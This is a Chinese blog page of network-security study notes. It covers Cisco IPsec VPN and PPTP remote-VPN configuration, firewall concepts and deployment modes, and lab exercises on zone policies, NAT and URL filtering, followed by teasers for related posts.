<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">conf t<br>	access-list 100 permit ip 192.168.0.0 0.0.255.255 172.16.0.0 0.0.255.255	&#x27;&#x27;&#x27;流量控制;定义vpn触发流量<br>	crypto ipsec transform-set 传输模式名 esp/ah-des/3des/aes esp/ah-md5/sha-hmac	&#x27;&#x27;&#x27;倒数第二个参数用于数据加密，最后一个参数用于身份认证和完整性，因此第一个选ESP,第二个选AH； 传输模式名可以自定义，后面需要使用同样的esp加密和esp/ah认证时，可以直接使用自定义名称<br>	&#x27;&#x27;&#x27;ESP：支持加密及认证（身份验证+完整性） AH：只支持认证（身份验证+完整性）认证力度比ESP强；若是第一阶段定义了加密密钥，则此阶段只能使用ESP,而可选的三个对称加密算法都能使用第一阶段提供的密钥进行加密，因此可以不同，但是建议一致<br>	&#x27;&#x27;&#x27;例如<br>	crypto ipsec transform-set xin esp-aes esp-sha-hmac		&#x27;&#x27;&#x27;使用aes对数据加密，使用sha和hmac进行身份认证；hmac为预共享密钥，同时这一条流程命名为 xin <br></code></pre></td></tr></table></figure>

<h6 id="–最后一步：让配置在端口上生效"><a href="#–最后一步：让配置在端口上生效" class="headerlink" title="–最后一步：让配置在端口上生效"></a>–最后一步：让配置在端口上生效</h6><p>​			创建MAP映射表（思科）：将上面的配置汇总到一张表中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">conf t<br>	crypto map map名 1 ipsec-isakmp		&#x27;&#x27;&#x27;参数1的作用：一个外网端口只能应用一张map表，意味着当需要与多个目标建立vpn时，使用参数1做区分，即通过该参数可以做到一张map对应多个vpn配置,且区分依据为该参数（或者理解为隧道号）<br>		match address 100<br>		set transform-set xin<br>		set peer 对方的公网ip地址<br>		exit<br>		<br>&#x27;&#x27;&#x27;将map表应用到外网端口<br>int f0/1<br>	crypto map map名<br>	<br>&#x27;&#x27;&#x27;查看命令<br>show crypto isakmp policy		&#x27;&#x27;&#x27;查看阶段一的配置策略集<br>show crypto ipsec transform-set &#x27;&#x27;&#x27;查看第二阶段的传输模式<br>show crypto isakmp sa			&#x27;&#x27;&#x27;查看阶段一状态<br>show crypto ipsec sa			&#x27;&#x27;&#x27;查看阶段二的状态<br></code></pre></td></tr></table></figure>

<h5 id="2）当外网端口同时配置了PAT和NAT后，生效的先后顺序？"><a href="#2）当外网端口同时配置了PAT和NAT后，生效的先后顺序？" class="headerlink" title="2）当外网端口同时配置了PAT和NAT后，生效的先后顺序？"></a>2）当外网端口同时配置了PAT和NAT后，生效的先后顺序？</h5><p>​		内网—》外网：路由—-NAT—-VPN—出去</p>
<p>​		<code>注意：只有当源ip与路由内网处于同一网段才会经过NAT，否则直接  路由-----VPN----出去</code></p>
<h5 id="3）实验"><a href="#3）实验" class="headerlink" title="3）实验"></a>3）实验</h5><p><img src="/staticImg/image-20240517182255571.png" alt="image-20240517182255571"></p>
<p><img src="/staticImg/image-20240517181941643.png" alt="image-20240517181941643"></p>
<h4 id="16-3远程VPN："><a href="#16-3远程VPN：" class="headerlink" title="16.3远程VPN："></a>16.3远程VPN：</h4><ul>
<li><p>PPTP VPN、L2TP VPN一般windows自带，SSL VPN需要下载软件；前两个软件使用的端口号是 <code>TCP 1723</code></p>
</li>
<li><p>需要在公司搭建VPN服务器</p>
</li>
<li><p>VPN服务器需要对VPN客户端进行身份验证</p>
</li>
<li><p>VPN服务器需要给VPN客户端下发权限及IP地址（私网）</p>
</li>
</ul>
<h5 id="1）实验"><a href="#1）实验" class="headerlink" title="1）实验"></a>1）实验</h5><p>​	要求：开启三台虚拟机：一台XP，两台Windows2003；将XP视作为国内PC，其中一台win2003作为VPN服务器，另一台win2003作为国外PC</p>
<h6 id="—准备工作"><a href="#—准备工作" class="headerlink" title="—准备工作"></a>—准备工作</h6><ul>
<li>XP桥街到vmnet1，ip设置为100.1.1.2&#x2F;24；VPN服务器购买俩快网卡，其中一张网卡桥接到vmnet1，ip设置为100.1.1.1&#x2F;24，另一张网卡桥接到vmnet2，ip设置为200.1.1.1&#x2F;24；国外PC桥接到vmnet2，IP设置为200.1.1.2&#x2F;24</li>
<li>首先在国外PC上安装IIS服务器并发布一个网站</li>
<li>接着在VPN服务器上开启VPN服务：管理工具—-路由和远程访问—-右键—-配置并启用路由访问—–自定义设置—选择vpn访问、拨号访问、NAT和基本防火墙—-完成即可</li>
<li>由于需要拨号进行身份验证，需要在VPN服务器本地创建一个用户，并在<code>用户属性</code>中的<code>拨入</code>菜单中的<code>远程访问权限</code>的子选项中，选择<code>允许访问</code></li>
<li>有了身份验证还不够，当身份验证成功之后，VPN服务器还需要给用户下发ip：服务器—右键—-属性—-<code>IP</code>菜单—选择<code>静态IP</code>—<code>添加</code>—设置起始私有IP和结束IP—完成</li>
</ul>
<p>​		注意：属性菜单中的<code>安全</code>可以选择使用<code>windows身份验证</code>还是<code>RADIUS身份验证</code>；前者使用<code>本地账号验证</code>，后者使用<code>域身份验证</code></p>
<ul>
<li>最后一项配置：NAT；服务器子列表中—-<code>IP路由选择</code>—–子列表<code>NAT/基本防火墙</code>—-右键<code>新增接口</code>（注意接口选择：<code>选择国外网卡</code>）—-<code>公用接口连接到internet</code>—<code>在此接口上启用NAT</code>—-完成</li>
</ul>
<h6 id="—开始在XP上拨号建立VPN连接（PPTP）（过程随windows版本变化而变化）"><a href="#—开始在XP上拨号建立VPN连接（PPTP）（过程随windows版本变化而变化）" class="headerlink" title="—开始在XP上拨号建立VPN连接（PPTP）（过程随windows版本变化而变化）"></a>—开始在XP上拨号建立VPN连接（PPTP）（过程随windows版本变化而变化）</h6><ul>
<li><code>网络邻居</code>—-左侧<code>创建一个新的连接</code>—-下一步选择<code>连接到我的工作场所的网络</code>—-下一步选择<code>虚拟专用网络连接</code>—-公司名自定义即可—-下一步<code>主机名或ip地址</code>填写VPN服务器的ip地址—-下一步<code>勾选在桌面创建快捷方式</code>（可选）—-完成—-进入身份验证—–输入服务器中提前创建好的账号密码即可</li>
</ul>
<h6 id="—扩展知识：PC也有路由表"><a href="#—扩展知识：PC也有路由表" class="headerlink" title="—扩展知识：PC也有路由表"></a>—扩展知识：PC也有路由表</h6><ul>
<li><p>查看PC路由表的命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">route print	&#x27;&#x27;&#x27;一旦拨号成功，PC路由表中会多出一条默认路由，指向VPN服务器的IP地址，且优先级比指向网关的默认路由更高，意味着除了访问本地局域网，其它流量都会被送到隧道<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="17防火墙"><a href="#17防火墙" class="headerlink" title="17防火墙"></a>17防火墙</h3><h4 id="17-1防火墙的基本概念"><a href="#17-1防火墙的基本概念" class="headerlink" title="17.1防火墙的基本概念"></a>17.1防火墙的基本概念</h4><ul>
<li>防火墙的定义：是一款具备安全防护功能的网络设备</li>
</ul>
<h5 id="1）隔离网络："><a href="#1）隔离网络：" class="headerlink" title="1）隔离网络："></a>1）隔离网络：</h5><p>​	（1）将需要保护的网络与不可信任网络进行隔离，隐藏信息并进行安全防护</p>
<h4 id="17-2防火墙的基本功能"><a href="#17-2防火墙的基本功能" class="headerlink" title="17.2防火墙的基本功能"></a>17.2防火墙的基本功能</h4><ul>
<li>访问控制：ACL</li>
<li>攻击防护：主要防护三层，四层数据</li>
<li>冗余设计：具有热备份功能</li>
<li>路由、交换：具有路由器和交换机的功能</li>
<li>日志记录：记录流量</li>
<li>虚拟专网VPN：能建立隧道</li>
<li>NAT：地址转换功能</li>
</ul>
<h4 id="17-3防火墙产品及厂家"><a href="#17-3防火墙产品及厂家" class="headerlink" title="17.3防火墙产品及厂家"></a>17.3防火墙产品及厂家</h4><ul>
<li>防火墙产品：H3C U200系列</li>
</ul>
<p><img src="/staticImg/image-20240519141222621.png" alt="image-20240519141222621"></p>
<ul>
<li>防火墙产品：juniper550M</li>
</ul>
<p><img src="/staticImg/image-20240519142009073.png" alt="image-20240519142009073"></p>
<ul>
<li>防火墙产品：天融信</li>
</ul>
<p><img src="/staticImg/image-20240519142801333.png" alt="image-20240519142801333"></p>
<h4 id="17-4区域隔离"><a href="#17-4区域隔离" class="headerlink" title="17.4区域隔离"></a>17.4区域隔离</h4><h5 id="1）防火墙区域概念"><a href="#1）防火墙区域概念" class="headerlink" title="1）防火墙区域概念"></a>1）防火墙区域概念</h5><ul>
<li>内部区域</li>
<li>DMZ区域：称为“隔离区”，也称“非军事区&#x2F;停火区”</li>
<li>外部区域</li>
<li><img src="/staticImg/image-20240519143305253.png" alt="image-20240519143305253"></li>
</ul>
<h4 id="17-5防火墙的分类"><a href="#17-5防火墙的分类" class="headerlink" title="17.5防火墙的分类"></a>17.5防火墙的分类</h4><ul>
<li><p>按防火墙形态</p>
<ul>
<li>软件防火墙</li>
<li>硬件防火墙</li>
</ul>
</li>
<li><p>按技术实现（硬件）</p>
<ul>
<li>包过滤防火墙</li>
<li>状态检测包过滤防火墙</li>
<li>应用（代理）防火墙</li>
<li>WAF防火墙</li>
<li>应用层防火墙</li>
</ul>
</li>
<li><p>软硬件防火墙的区别</p>
</li>
</ul>
<p><img src="/staticImg/image-20240519150228437.png" alt="image-20240519150228437"></p>
<h5 id="1）防火墙的发展史"><a href="#1）防火墙的发展史" class="headerlink" title="1）防火墙的发展史"></a>1）防火墙的发展史</h5><ul>
<li><p>包过滤防火墙：最早的防火墙技术之一，功能简单，配置复杂</p>
</li>
<li><p>应用网关&#x2F;应用代理防火墙：最早的防火墙技术之二，连接效率低，速度慢</p>
<p>​	每个代理需要一个不同的应用进程，或一个后台运行的服务程序，对每个新的应用必须添加针对此应用的服务程序，否则不能使用该服务<br>​	优点：安全性高，检测内容<br>​	缺点：连接性能差，可伸缩性差</p>
</li>
<li><p>状态检测防火墙：现代主流防火墙，速度快，配置方便，功能较多</p>
<p>​	检测流程（省略版）：<img src="/staticImg/image-20240519154121811.png" alt="image-20240519154121811"></p>
</li>
<li><p>DPI防火墙（Deep Packet Inspection）：未来防火墙的发展方向，能够高效的对第七层数据进行检测</p>
</li>
</ul>
<h5 id="2）衡量防火墙性能的五大指标："><a href="#2）衡量防火墙性能的五大指标：" class="headerlink" title="2）衡量防火墙性能的五大指标："></a>2）衡量防火墙性能的五大指标：</h5><ul>
<li>吞吐量：在不丢包的情况下单位时间内通过的数据包流量</li>
<li>时延：数据包第一个比特进入防火墙到最后一比特从防火墙输出的时间间隔</li>
<li>丢包率：通过防火墙传送时所丢失数据包数量占所发送数据包的比率</li>
<li>并发连接数：防火墙能够同时处理的点对点连接的最大数目</li>
<li>新建连接数：在不丢包的情况下每秒可以建立的最大连接数</li>
</ul>
<h5 id="3）防火墙的典型应用"><a href="#3）防火墙的典型应用" class="headerlink" title="3）防火墙的典型应用"></a>3）防火墙的典型应用</h5><ul>
<li><p>标准应用</p>
<ul>
<li><p>透明模式</p>
<p>​	透明模式&#x2F;桥模式一般用于用户网络已经建设完毕，网络功能基本已经实现的情况下，用户需要加装防火墙以实现安全区域隔离的要求；</p>
<p>​	一般将网络分为内部网、DMZ区和外部网</p>
</li>
<li><p>路由模式</p>
<p>​	路由模式&#x2F;NAT模式</p>
<p><img src="/staticImg/image-20240519162942066.png" alt="image-20240519162942066"></p>
</li>
<li><p>混杂模式</p>
<p>一般网络情况为透明模式和路由模式的混合</p>
<p><img src="/staticImg/image-20240519163201648.png" alt="image-20240519163201648"></p>
</li>
</ul>
</li>
</ul>
<h4 id="17-6配置、实验"><a href="#17-6配置、实验" class="headerlink" title="17.6配置、实验"></a>17.6配置、实验</h4><p><img src="/staticImg/image-20240519182819558.png" alt="image-20240519182819558"></p>
<h5 id="实验一：验证区域隔离及策略编写"><a href="#实验一：验证区域隔离及策略编写" class="headerlink" title="实验一：验证区域隔离及策略编写"></a>实验一：验证区域隔离及策略编写</h5><ul>
<li>PC配置IP及网关</li>
<li>防火墙：创建区域—-》接口加入到区域</li>
<li>接口配置ip、配置路由（本实验不需要配置）</li>
<li>写策略并验证</li>
</ul>
<h5 id="实验二：做源转换：SNAT"><a href="#实验二：做源转换：SNAT" class="headerlink" title="实验二：做源转换：SNAT"></a>实验二：做源转换：SNAT</h5><p>​	要求：在实验一的基础上，将外网PC的网关去掉！此时外网PC无法向内网回包！（模拟外网环境）</p>
<ul>
<li>配置源转换（PAT），保证inside 和 dmz能够上网</li>
</ul>
<h5 id="实验三：做目标转换：DNAT"><a href="#实验三：做目标转换：DNAT" class="headerlink" title="实验三：做目标转换：DNAT"></a>实验三：做目标转换：DNAT</h5><p>​	要求：在实验1-2的前提下：</p>
<ul>
<li><p>把DMZ区域的2003部署为web服务器，并发布出去</p>
<ul>
<li>做DNAT</li>
<li>写策略：放行outside —-&gt;  dmz的<code>172.16.1.1:80</code>才放行</li>
</ul>
</li>
<li><p>使用outside区域的2003（外网PC）通过访问<a target="_blank" rel="noopener" href="http://100.1.1.88/">http://100.1.1.88</a></p>
</li>
</ul>
<h5 id="实验四：应用层过滤（内容过滤）"><a href="#实验四：应用层过滤（内容过滤）" class="headerlink" title="实验四：应用层过滤（内容过滤）"></a>实验四：应用层过滤（内容过滤）</h5><p>​	要求：在实验1-3的基础上：</p>
<ul>
<li>将外网的2003部署为公网的某web服务器及DNS服务器</li>
<li>此时内网及DMZ区域的PC均能通过域名访问外网网站</li>
<li>做URL过滤。结果一般网站可以访问，黑名单URL禁止访问<ul>
<li>http内容过滤，结果包含违禁词的网站禁止访问</li>
</ul>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://blog.xintest.dpdns.org">xin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://blog.xintest.dpdns.org/2025/01/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://blog.xintest.dpdns.org/2025/01/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/encrypt/">encrypt</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E8%B7%AF%E5%AE%89%E5%85%A8/">网路安全</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/01/03/%E5%85%B6%E5%AE%83/" title="其它"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">其它</div></div><div class="info-2"><div class="info-item-1">一、win10修改SMB(共享文件)的默认端口 4451.步骤基于安全的考虑，服务器端的SMB(共享文件夹)应用通过FRP等工具将SMB应用的445端口映射到了公网IP的其他端口，或者直接修改了SMB的默认端口  win10 右键开始菜单 - Windows PowerShell(管理员)，以管理员模式打开PowerShell，输入以下命令配置一个端口转发： 1netsh interface portproxy add v4tov4 listenport=445 listenaddress=127.0.0.1 connectport=30455 connectaddress= 117.73.12.12  效果就是本机访问127.0.0.1的445端口时，会转发到远程IP地址(117.73.12.12)的30445端口  查看端口转发配置列表，可以看到已经成功转发 1netsh interface portproxy show all  打开系统服务管理器，找到server，右键属性–&gt; 启动类型改为禁用，然后重启电脑，再次查看服务状态，没有正在运行就是成功了 单击开始菜单，...</div></div></div></a><a class="pagination-related" href="/2025/01/03/Web%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Web安全 学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Web安全 学习笔记</div></div><div class="info-2"><div class="info-item-1">WEB安全基础概述​	基础概述中涉及的工具的获取：  名词解释：121.https://www.cnblogs.com/sunny11/p/13583083.html2.封包和抓包的不同之处？  整体和零散的区别，封包能精确到每个操作的数据包  涉及的靶场：121.墨者靶场2.https://www.vulhub.org/		Vulhub靶场，常见中间件漏洞：自己搭建靶场  涉及的工具及网站（有一些可能有后门，尽量不要在真实机上使用）：12345678910111213141516171819201.Burpsuit  : 抓包工具2.宝塔		: 搭建网站的工具3.快代理		: 配置ip代理4.封包监听工具（傻瓜式）/WPE封包四件套	：能抓到完成某种操作的一系列数据包集合的工具；普通抓包工具抓到的都是集合中分散的数据包&#x27;&#x27;&#x27;端口扫描工具1.超级ping：CDN服务识别2.Masscan：端口扫描，应用协议3.Wafw00f（比较全）：Web应用防护防火墙识别4.Nmap：端口扫描，应用协议，防火墙识别5.lbd：负载均衡、广域网负载均衡、应用层负载...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/03/Web%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Web安全 学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-03</div><div class="info-item-2">Web安全 学习笔记</div></div><div class="info-2"><div class="info-item-1">WEB安全基础概述​	基础概述中涉及的工具的获取：  名词解释：121.https://www.cnblogs.com/sunny11/p/13583083.html2.封包和抓包的不同之处？  整体和零散的区别，封包能精确到每个操作的数据包  涉及的靶场：121.墨者靶场2.https://www.vulhub.org/		Vulhub靶场，常见中间件漏洞：自己搭建靶场  涉及的工具及网站（有一些可能有后门，尽量不要在真实机上使用）：12345678910111213141516171819201.Burpsuit  : 抓包工具2.宝塔		: 搭建网站的工具3.快代理		: 配置ip代理4.封包监听工具（傻瓜式）/WPE封包四件套	：能抓到完成某种操作的一系列数据包集合的工具；普通抓包工具抓到的都是集合中分散的数据包&#x27;&#x27;&#x27;端口扫描工具1.超级ping：CDN服务识别2.Masscan：端口扫描，应用协议3.Wafw00f（比较全）：Web应用防护防火墙识别4.Nmap：端口扫描，应用协议，防火墙识别5.lbd：负载均衡、广域网负载均衡、应用层负载...</div></div></div></a><a class="pagination-related" href="/2025/01/03/java-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="java 学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-03</div><div class="info-item-2">java 学习笔记</div></div><div class="info-2"><div class="info-item-1">NOW、待做1.给blog加上评论，需要完善…..2.普通用户，最开始注册的时候没有填写个人信息，导致home界面无法显示个人中心的数据 2.页面的鉴权功能（限制进入人员管理页面）（完成一半：非管理人员无法修改数据） 3.将CodePen中的钟表加在主页 4.对blog中简历界面，增加一个功能，通过在线填写数据，传给后端后返回一个pdf的简历 5.引入redis和Es 6.通过windows的定时任务，定时删除数据库中的oldFile（图片&#x2F;pdf）需求描述：在数据库中存储文件的表中加上一个字段 ‘status’ ，值为0或1，0代表该文件为oldFile,在定时任务中进行删除，否则不删除 7.完善一些细节，比如文件的逻辑删除，loading界面等等 一、git实现同时对接github和gitee？原文网址具体操作：  生成 key，将邮件地址替换为你 Gitee 或者 Github 使用的邮件地址 123#生成 key，将邮件地址替换为你 Gitee 或者 Github 使用的邮件地址#注意：在生成密钥时不要输入密码，直接回车即可，不然之后每次连都需要输入密码ssh-...</div></div></div></a><a class="pagination-related" href="/2025/01/03/vue2-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="vue2 学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-03</div><div class="info-item-2">vue2 学习笔记</div></div><div class="info-2"><div class="info-item-1">笔记脚手架文件结构├── node_modules  ├── public │   ├── favicon.ico: 页签图标 │   └── index.html: 主页面 ├── src │   ├── assets: 存放静态资源 │   │   └── logo.png │   │── component: 存放组件 │   │   └── HelloWorld.vue │   │── App.vue: 汇总所有组件 │   │── main.js: 入口文件 ├── .gitignore: git版本管制忽略的配置 ├── babel.config.js: babel的配置文件 ├── package.json: 应用包配置文件  ├── README.md: 应用描述文件 ├── package-lock.json：包版本控制文件  关于不同版本的Vue vue.js与vue.runtime.xxx.js的区别： vue.js是完整版的Vue，包含：核心功能 + 模板解析器。 vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。  ...</div></div></div></a><a class="pagination-related" href="/2025/05/25/%E6%96%B0%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B%EF%BC%88Vue3+SpringBoot2%EF%BC%89/" title="新项目开发流程"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-25</div><div class="info-item-2">新项目开发流程</div></div><div class="info-2"><div class="info-item-1">新项目开发流程新建项目选择项目类型（boot，cloud）———》jdk 版本 ——–》boot、cloud 版本 导入依赖-pom.xml通用依赖：mvc、mybatis&#x2F;mybatis-plus、hutool、mysql、接口文档、aop 编程等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w...</div></div></div></a><a class="pagination-related" href="/2025/01/03/%E5%85%B6%E5%AE%83/" title="其它"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-03</div><div class="info-item-2">其它</div></div><div class="info-2"><div class="info-item-1">一、win10修改SMB(共享文件)的默认端口 4451.步骤基于安全的考虑，服务器端的SMB(共享文件夹)应用通过FRP等工具将SMB应用的445端口映射到了公网IP的其他端口，或者直接修改了SMB的默认端口  win10 右键开始菜单 - Windows PowerShell(管理员)，以管理员模式打开PowerShell，输入以下命令配置一个端口转发： 1netsh interface portproxy add v4tov4 listenport=445 listenaddress=127.0.0.1 connectport=30455 connectaddress= 117.73.12.12  效果就是本机访问127.0.0.1的445端口时，会转发到远程IP地址(117.73.12.12)的30445端口  查看端口转发配置列表，可以看到已经成功转发 1netsh interface portproxy show all  打开系统服务管理器，找到server，右键属性–&gt; 启动类型改为禁用，然后重启电脑，再次查看服务状态，没有正在运行就是成功了 单击开始菜单，...</div></div></div></a><a class="pagination-related" href="/2025/01/11/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE/" title="科学上网-各种协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-11</div><div class="info-item-2">科学上网-各种协议</div></div><div class="info-2"><div class="info-item-1">网络协议参考视频网址：不良林 1.ss（ShadowSocks）协议（1）加密方式：对称加密(对数据进行加密)（2）配置-服务端123456789&#123;    &quot;server&quot;: &quot;0.0.0.0&quot;,    &quot;mode&quot;: &quot;tcp_and_udp&quot;,    &quot;server_port&quot;: 8388,    &quot;local_port&quot;: 1080,    &quot;password&quot;: &quot;123456&quot;,    &quot;timeout&quot;: 86400,    &quot;method&quot;: &quot;chacha20-ietf-poly1305&quot;&#125;  加密方式可以自主选择，但是客户端和服务器要保持一致 （3）查看日志的命令（因为ss协议容易被精准识别）1journalctl -u shadowssocks-libev.service -f  通过日志可以观察到GFW对服务器进行的重放攻...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xin</div><div class="author-info-description">收藏从未停止，学习从未开始！</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xin-github-test"><i class="fab fa-github"></i><span>关注我的github</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客！！！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81windows%E5%88%9B%E5%BB%BA%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.</span> <span class="toc-text">一、windows创建定时任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%EF%BC%89%E9%80%9A%E8%BF%87%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%E5%88%9B%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">1）通过图形化界面创建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%EF%BC%89%E9%80%9A%E8%BF%87%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E5%88%9B%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">2）通过编写脚本创建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%EF%BC%89%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AF%B9%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.</span> <span class="toc-text">3）通过命令行对定时任务的一些操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81linux%E8%BF%9B%E7%A8%8B%E8%A2%ABkill-%E5%90%8E%EF%BC%8C%E6%9F%A5%E7%9C%8B%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">二、linux进程被kill 后，查看原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%89%E8%A3%85windowsXp-%E5%92%8C-windows2003%E5%90%8E%E7%9A%84%E4%BC%98%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">三、安装windowsXp 和 windows2003后的优化过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%9A%90%E8%97%8F%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA"><span class="toc-number">4.</span> <span class="toc-text">四、隐藏磁盘分区</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%B0%86%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E7%A9%BA%E9%97%B4%E7%94%A8%E4%BD%9C%E7%A3%81%E7%9B%98"><span class="toc-number">5.</span> <span class="toc-text">五、将内存中的空间用作磁盘</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8"><span class="toc-number">6.</span> <span class="toc-text">六、windows命令大全</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8"><span class="toc-number">7.</span> <span class="toc-text">Linux命令大全</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E7%BD%91%E5%AE%89%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">8.</span> <span class="toc-text">七、网安相关知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84%E7%9A%84%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-number">8.1.</span> <span class="toc-text">1.用户和组的概念：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 